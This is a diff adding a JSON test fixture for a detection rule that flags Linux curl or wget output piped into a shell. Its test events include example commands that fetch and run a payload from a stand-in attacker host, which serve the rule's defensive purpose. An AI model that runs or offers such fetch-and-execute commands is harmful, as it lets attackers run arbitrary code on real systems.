@@ -1,0 +1,37 @@
+{
+  "rule": "sigma/linux/lnx_suspicious_curl_pipe_bash.yml",
+  "description": "curl|wget piped to a shell — classic Linux dropper pattern (T1059.004 / T1105)",
+  "match_condition": {
+    "CommandLine": { "regex": "(?i)\\b(curl|wget)\\b.*\\|\\s*(bash|sh|zsh)\\b" }
+  },
+  "test_cases": [
+    {
+      "name": "matches curl | bash",
+      "expected": "match",
+      "event": {
+        "CommandLine": "curl -s http://attacker.example/install.sh | bash"
+      }
+    },
+    {
+      "name": "matches wget | sh",
+      "expected": "match",
+      "event": {
+        "CommandLine": "wget -qO- http://x/payload | sh"
+      }
+    },
+    {
+      "name": "does not match plain curl download",
+      "expected": "no_match",
+      "event": {
+        "CommandLine": "curl -O http://example.com/file.tar.gz"
+      }
+    },
+    {
+      "name": "fp-lookalike: official software install instructions (still flagged conservatively)",
+      "expected": "match",
+      "event": {
+        "CommandLine": "curl -fsSL https://get.docker.com | sh"
+      }
+    }
+  ]
+}
